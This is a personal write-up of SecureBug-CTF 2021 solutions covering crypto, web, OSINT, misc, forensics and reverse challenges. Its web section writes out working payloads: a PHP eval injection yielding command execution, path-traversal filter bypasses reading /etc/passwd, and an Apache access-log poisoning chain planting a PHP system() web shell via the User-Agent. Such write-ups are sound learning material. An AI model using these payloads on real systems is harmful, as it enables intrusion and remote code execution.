# SecureBug-CTF
SecureBug-CTF 2021

Hello every one,
Today i will give you My write-up for SecureBug-CTF...
First CTF was Teams 1 to 3 at max, and was 22 Challenge at all. 

We were 155 Team
I got Ranked 16 alone against all teams and solved 14 out of 22 Challenge. 

## Let's Start with Cryptography Challenges:
 * solved 3 out of 3 
#### 1) Multi-language man  [Easy]
No Disc... 

it was a file after downloading it, found this one 
`ыисеаХершы_шы_ф_адфп_ащк_адфп_дщмукыЪ` 

first thing in my mind `Multi-language` -> then went to Google and translated it and unlucky i got `yiseaHershy_shy_fadfp_ashk_adfp_dhmuky` but what i know else was this is an Russian Language after some searches i got the best Solution for this one. 

That this is an Keyboard [English - Russian] ... 
![Pasted image 20211128120328](https://user-images.githubusercontent.com/77472776/143768882-52849df3-cfa3-48c7-ba8c-d58d915f5162.png)
i used this image to get the flag manually xD 

Flag: `SBCTF{this_is_a_flag_for_flag_lovers}` 

#### 2) ROR  [Medium] 
Disc: "A super secure and state of the art new cipher!!! As a test, we have secured a flag with it, try to get the flag." 
First Downloaded files, it was 2 files
output.txt : 
```
[98, 6, 16, 84, 28, 59, 8, 27, 41, 99, 52, 68, 54, 100, 78, 103, 39, 88, 79, 49, 127, 7, 8, 24, 36, 125, 54, 106, 41, 25, 28, 92, 20, 51, 114, 115, 49, 110, 103, 95, 82, 44, 102, 27, 117, 85, 62, 15, 20, 114, 125, 105, 85, 38, 101, 77, 119, 63, 117, 62, 111, 98, 78, 111]
```
encrypt.py 
```
from random import randrange
from secret import flag 


def encrypt(p):
	l = []
	for i in range(len(p)):
		l.append(ord(p[i]))
	while len(l) % 64 != 0:
		l.append(randrange(33, 125))
	c = len(l) % 64
	for i in range(c+1):
		for j in range(24):
			l[0*(i+1)] = l[0*(i+1)] ^ l[32*(i+1)]
			l[8*(i+1)] = l[8*(i+1)] ^ l[40*(i+1)]
			l[16*(i+1)] = l[16*(i+1)] ^ l[48*(i+1)]
			l[24*(i+1)] = l[24*(i+1)] ^ l[56*(i+1)]
			l_t = l[:]
			for z in range(len(l)):
				l[z] = l_t[z-1]
	return l

print(encrypt(flag))
```

then i started to understand what code do and reversed it 

decrypt.py 
```
def decrypt():  
   l = [98, 6, 16, 84, 28, 59, 8, 27, 41, 99, 52, 68, 54, 100, 78, 103, 39, 88, 79, 49, 127, 7, 8, 24, 36, 125, 54, 106, 41, 25, 28, 92, 20, 51, 114, 115, 49, 110, 103, 95, 82, 44, 102, 27, 117, 85, 62, 15, 20, 114, 125, 105, 85, 38, 101, 77, 119, 63, 117, 62, 111, 98, 78, 111]  
   for j in range(24):  
      l.append(l.pop(l.index(l[0])))  
      l[0] = l[0] ^ l[32]  
      l[8] = l[8] ^ l[40]  
      l[16] = l[16] ^ l[48]  
      l[24] = l[24] ^ l[56]  
   for z in range(len(l)):  
      print(chr(l[z]), end="")  
   print("")  
print(decrypt())
```

Flag: `SBCTF{R3v3rs1ng_ROR_C1ph3r}`

#### 3) Shingeki no RSA  [Hard]
Disc: One encryption, three params, you know what to do.
it was the easiest one xD 

first thing i do which see RSA challenge with n,e,c  using `RsaCtfTool.py`

```
e = 573539981054118375159951884901136205381955275096471242113613923667834312363548126598981740314307696033323138227176735824259098674326069670063001503892366653022633390483272968412233602239104757299239510751275655288670147128536527296060843927282827574422039154045360669647002461865276005609405093376965933104257

n = 666012509503758414438426745752029036046328310944346357068259451859585174290580664150188141697939659811599336002592599704089746160399428670863696780761420173279676565150259812749267725206078003773597631925996185977321417456827136083352043009732414371490356153874019687554196902819696964658218055292422529903061

c = 208271638964220806986932660131544686073844142913497222151993342727885811478884727510239109595118929917803309949401762080874858518281133929171859315997601484068462684780596513932104673255797873067799046024798017005908221308124294210078684387266545107254593378287958436606968619452939117043031695740389528821956
```

I used `RsaCtfTool.py` and got the flag xD 
```
./RsaCtfTool.py -n 666012509503758414438426745752029036046328310944346357068259451859585174290580664150188141697939659811599336002592599704089746160399428670863696780761420173279676565150259812749267725206078003773597631925996185977321417456827136083352043009732414371490356153874019687554196902819696964658218055292422529903061 -e 573539981054118375159951884901136205381955275096471242113613923667834312363548126598981740314307696033323138227176735824259098674326069670063001503892366653022633390483272968412233602239104757299239510751275655288670147128536527296060843927282827574422039154045360669647002461865276005609405093376965933104257 --uncipher 208271638964220806986932660131544686073844142913497222151993342727885811478884727510239109595118929917803309949401762080874858518281133929171859315997601484068462684780596513932104673255797873067799046024798017005908221308124294210078684387266545107254593378287958436606968619452939117043031695740389528821956
```

Flag: `SBCTF{d1d_y0u_us3_w13n3r's?}`

-----------------------------------------------------------------------------------------
## Now Lets Go to Web Challenges: 
for web there was many new challenges and learned from it new bypassing techniques... 
* solved 5 out of 7
#### 1) Break the logic [Easy] 
Disc: Listen to the old man!

First thing i saw after enter Challenge is that -> 
![Pasted image 20211128123257](https://user-images.githubusercontent.com/77472776/143768883-f1df7def-3ca6-43c9-a3b3-7435d786b58f.png)
Server error 500 !!! but wait it's loaded and this is content of page actually.

checked the page source code but no thing.
tried to get /robots.txt but Not Found ... 

then i went to dir Brute-forcing 
and got only 2 dirs  `/admin , /submit` 

Checked /admin found login page. 
So went to submit i thought that i will find the Cred in it xD 
Found a white page with no content.. checked the Page source code 
![Pasted image 20211128123927](https://user-images.githubusercontent.com/77472776/143768884-54a7d115-079a-4354-a258-2e47adf6ad10.png)

found this key, with word `this key to forge a request` so i said it will be CSRF. 
checked the Cookie with `Cookie-Editor` Extension and found parameter `csrftoken` changed value with what i got.. but page still empty .. checked code again and found the flag commented 
![Pasted image 20211128124313](https://user-images.githubusercontent.com/77472776/143768885-263bbd0d-eae3-4a0d-baee-52463acfb042.png)

Flag: `SBCTF{L0g!cs_M@n_I_H@t3_7h3m}`

#### 2) Phpbaby  [Easy]
Disc: Get the flag located at the root filesystem

first thing i saw was this `lettercrap.js`
![Pasted image 20211128124515](https://user-images.githubusercontent.com/77472776/143768886-711d930f-b5c2-4d75-8c98-7a35b30bd870.png)
and keep changing.. checked code found found comment say 
`<!-- Access To Source Code Is Not Allowed! -->`
so decided to check /robots.txt `disallow: /Source_Code_Backup` 

after i went to this page found this code commented in Source code
```
 <!--
// Source Code Backup:
$SBCTF=@(string)$_GET['SBCTF'];
filter($boycott, $SBCTF);
eval('$SBCTF="'.addslashes($SBCTF).'";');
-->
```
so!! the page accept Param name SBCTF but there was a eval function need to bypassing , it was new for me. 

after some searching for a good [reference](https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php) explain how to bypass this one.

tried payload and it's work.. 
`SBCTF=var_dump(${eval($_GET[1])}=123)&1=phpinfo();`
then started to change phpinfo() to system() and Got my RCE xD 
after using `ls` command i found the flag . 

last payload -> 
`?SBCTF=var_dump(${eval($_GET[1])}=123)&1=system('ls ../../../');`
![Pasted image 20211128125526](https://user-images.githubusercontent.com/77472776/143768887-85b24587-e91f-40f8-9888-a5558f73adab.png)
Flag: `SBCTF{eval_93da83d498872a4028dac140d1574290}`

#### 3) Tricks 1   [Easy] 
Disc: A couple of PHP tricks, give it a try.

after i opened Challenge i found a php code and need to bypass 
![Pasted image 20211128130449](https://user-images.githubusercontent.com/77472776/143768888-55b507b6-9826-4466-b6e9-dc78b42cd495.png)

after some searching if found that sha1 & md5 waiting for string value. 
we can bypassing that by send array instead of string parameter 
[Reference](https://medium.com/@mena.meseha/php-functions-security-issues-755ce4c8643c)

payload -> `/?a[]=a&b[]=b` this will make error in sha1 & md5 checking and give me the flag... 

Flag: `SBCTF{g07_2_w17h_0n3_SH07?}`

#### 4) Trick 2  [Medium]
Disc: Another round of PHP Tricks, good luck.

First page was giving me an php code for checking function 
![Pasted image 20211128132215](https://user-images.githubusercontent.com/77472776/143768889-f907bf3d-491b-495c-9870-7e6ff2cb221b.png)

Like `Trick1` challenge but here is about 
strlen() -> checking for number of bytes in word 
mb_strlen() -> print the actual number for chars 

so i searched for some bypassing technique. found that we can send word not English this will made Bytes > Num of Char   

so i found word like this `Tschüss` after put as value it make url encoding `Tsch%C3%BCss` that make a changing in Bytes & Char Num. 
[Reference](https://pretagteam.com/question/php-strlen-returns-character-length-instead-of-byte-length)

Flag: `SBCTF{d1d_y0u_kn0w_abou7_7h47?}`

#### 5) Poison  [Hard]
Disc: Bypass some stuff and get the flag! 

When i open challenge was an empty page.. after checking code found iframe with src go to another link.
after opening it found this content with a Parameter in URL

![Pasted image 20211128133238](https://user-images.githubusercontent.com/77472776/143768890-a04c1fc6-3187-439f-8b33-5f54db84f10f.png)

Start to bypassing it using path traversal bypassing technique.. 
payload `?file=..././..././..././..././..././..././..././..././etc/passwd`

and i was able to read passwd file ... but what to do after that? i didn't know file name or even path... 
so i started to search about getting RCE from LFI. and as usual `PayloadsAllTings` helps much.. 
found that i can use ``/var/log/apache2/access.log`` as a portal for my connection.

so from a terminal i used this payload 
`curl-A "<?php system(\$_GET['cmd']);?>" http://64.225.23.248/` 
this will change my User-agent as php  code... then when i'm reading /access.log file will exec this Parameter else.. 

and from my Browser used this payload
`..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././var/log/apache2/access.log&cmd=id`
and it works fine
![Pasted image 20211128134238](https://user-images.githubusercontent.com/77472776/143768892-c2212653-9d75-4500-a1b5-e323d8272a66.png)

so used `ls ` on the / dir to check flag file name and found it `getyourfl4g`

Flag: `SBCTF{You_Pois0ned_Me}`

-----------------------------------------------------------------
### Now Let's go for some OSINT & MISC 
* solved 3 out of 6
#### 1) Discord  [Easy]  [OSINT]
Disc: 
"Find the account creation date of one of our discord channel admins (4dam). Note: Please put the date in this format YYYY/MM/DD for submission, like this: SBCTF{1970/01/01} "


it was an easy one if you now more about Discord.

i went to Discord and got the ID for admin (4dam)
then went to site [Discord LookUP](https://discord.id/) 

and found Info about him  what is important is 
`Created: Tue, 09 Feb 2021 13:05:05 UTC`

Flag: `SBCTF{2021/02/09}` 

#### 2) Query the Flag  [Easy]  [Misc] 
Disc: Query the flag 

after downloading the file i found it was `find.db` then woow it's very easy. 
went to  `sqlite3` 
command -> `sqlite3 find.db .dump | grep -i "SBCTF"` 
what i got was Insert line for flag 
`INSERT INTO falg256 VALUES('SBCTF{I_w@s_s0_sl33py_D3s1gn1ng_7h1s}','NULL');`

Flag: `SBCTF{I_w@s_s0_sl33py_D3s1gn1ng_7h1s}`

#### 3) Http flag [Medium]  [MISC] 
NO Disc.

after downloading folder found that it's a source code for w project.
started to check it.. and for first folder opened was `bin` folder i found only one file `http-server`. 
checked it was a big file but what got my attention was this part -> 
![Pasted image 20211128135942](https://user-images.githubusercontent.com/77472776/143768893-049c3307-d38e-4a84-89b3-8585569ede38.png)

`010100110100001001000011010101000100011001111011001101110100100000110011010100110011001101011111010011010011000101010011010000110101001101011111010000010101001000110011010111110100011100110000010010010100111001000111010111110101001100110000010111110011001101000001010100110101100101111101`
got this binary and went to [Codebeautify](https://codebeautify.org/binary-string-converter) convert this Binary to string and Booooom!! it's The flag xD 

Flag: `SBCTF{7H3S3_M1SCS_AR3_G0ING_S0_3ASY}` 

and as flag say are so easy or i'm lucky xD xD 

-------------------------------------------------------------------------
### Now Let's go to The Blue Team Part RE & DF which i was lucky to solve those xD 
* Solved 3 out of 6 

#### 1) Happy Flag [Easy]  [Forensics] 
Disc: We have many flags. But we need a good flag! 

after downloaded folder and unzip it found another zip file in.. 
so i extracted that too.. found 20202 txt file `ls | wc` xD
![Pasted image 20211128140751](https://user-images.githubusercontent.com/77472776/143768895-c9ba777e-6906-43f2-ade7-657e37fd23f0.png)

so it's easy with cat & grep-> `cat *.txt | grep -i "SBCTF"`

Flag: `SBCTF{Cool_flag_!!!}`

#### 2) CVEmaster  [Medium]  [Forensics] 
Disc: 
"A hacker is targeting our HR portals and deleting our files. He also tried to hack one of our new websites but fortunately, he was not successful this time. We believe that the hacker is a script kiddie and using a known exploit. Can you find the hacker's IP address and the name of Application Server he is targeting? 

The flag format is: 
	SBCTF{A_B} 
	A = Ip address of the attacker 
	B = name of the target application server in lowercase"
	
After downloading file i found that it's pcap file. 
So Only one Tool we will use xD `WireShark`

after open the file found many traffics so sorting with Protocol  
![Pasted image 20211128141345](https://user-images.githubusercontent.com/77472776/143768896-e043bf94-1cff-4ccf-b6ec-d469c68ed0d4.png)

after sorting found many traffics from this IP `181.214.227.77` requesting for flag and admin-panel so i assumed that this is Attacker IP.. 
then Started to Follow TCP Streams... 

in one of them i found that Attacker trying access console for service with inspect action 
![Pasted image 20211128141957](https://user-images.githubusercontent.com/77472776/143768898-4833f0f6-a4c9-49f9-b514-00fd7577fea5.png)

so took this name `/jmx-console/HtmlAdaptor` and searched for CVE for it cause Challenge name is CVEmaster xD ... i found that this console related to server `jboss`
so tried it and it's true.

Flag: `SBCTF{181.214.227.77_jboss}`

#### 3) Navy encoding  [Easy]  [Reverse]  
Disc: Let’s get our hands dirty with some navy stuff 

After Downloaded the Folder found 3 Files `Main.java, solve.java, fina `

Start reading solve.java and understanding it.. 
```
import java.util.Arrays;
public class solve{
	public static void main(String[] args) {
		String Solve="~ea9tTHx2wD4Cw@Lo1bjZVgiCLo7z~";
		char array[]=Solve.toCharArray();
		for (int i=0;i<array.length;i++){
            if (i%2==0){
                array[i]= (char) (array[i]^2);
            }
        }
		StringBuilder stringBuilder=new StringBuilder();
        for (char ch:array){
            stringBuilder.append(ch);
        }
		//System.out.println(stringBuilder);
		int j=5;
		for (int i=array.length-1;i>=0;i--){
            if (i%5==0){
                if (j!=0) {
                   // System.out.println(i + " : " + array[i]);
                    char a = array[j* 5];
                    //System.out.println(a);
                    array[j* 5] = array[j-1];
                    array[j-1] = a;
                }
                j--;
            }
        }
		stringBuilder=new StringBuilder();
        for (char ch:array){
            stringBuilder.append(ch);
        }
		//System.out.println(stringBuilder);
		int randoms[] = new int[6];
		for (int i=1;i<11;i++){
			if ((char)(array[0]-i)=='S'){
				randoms[0]=i;
			}
		}
		for (int i=1;i<11;i++){
			if ((char)(array[1]-i)=='B'){
				randoms[1]=i;
			}
		}
		for (int i=1;i<11;i++){
			if ((char)(array[2]-i)=='C'){
				randoms[2]=i;
			}
		}
		for (int i=1;i<11;i++){
			if ((char)(array[3]-i)=='T'){
				randoms[3]=i;
			}
		}
		for (int i=1;i<11;i++){
			if ((char)(array[4]-i)=='F'){
				randoms[4]=i;
			}
		}
		for (int i=1;i<11;i++){
			if ((char)(array[5]-i)=='{'){
				randoms[5]=i;
			}
		}
		 //System.out.println(Arrays.toString(randoms));
		 int i=0;
		 for (char b:array) {
            array[i] = (char) (b - randoms[i % 6]);
            i++;
        }
		stringBuilder=new StringBuilder();
        for (char ch:array){
            stringBuilder.append(ch);
        }
		System.out.println(stringBuilder);
	}
}
```
Found that flag will output from running this file xD 
commands `javac solve.java; java solve`

Flag: `SBCTF{It's_3@s9_g0_f0R_h@rd3r}`


-------------------------------------------------------------------------

And at the end That's all for Today and for this CTF... 
hope you interest with my write-up... 
Wait for more soon... 

You can Follow me on [Facebook](https://www.facebook.com/foushgx) | [LinkedIn](https://www.linkedin.com/in/foushgx/) | [Twitter]()
